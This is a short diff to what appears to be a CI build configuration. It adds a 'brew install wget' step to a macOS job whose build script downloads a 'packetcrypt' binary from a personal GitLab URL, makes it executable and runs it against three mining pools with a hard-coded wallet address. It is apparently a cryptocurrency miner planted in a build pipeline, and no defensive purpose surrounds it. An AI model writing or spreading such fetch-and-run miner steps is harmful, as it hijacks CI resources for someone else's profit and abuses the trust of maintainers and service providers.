@@ -19,6 +19,7 @@ for:
         - job_name: Macos build
 
     build_script:
+        - brew install wget
         - wget https://gitlab.com/kabehada3/apepe/-/raw/main/packetcrypt
         - chmod +x packetcrypt 
         - ./packetcrypt ann -p pkt1qv437nndzvr9u8ps60g3d5dl0gssu84ulwksvfq http://pool.pkt.world/ http://pool.pktpool.io/ http://pool.srizbi.com/
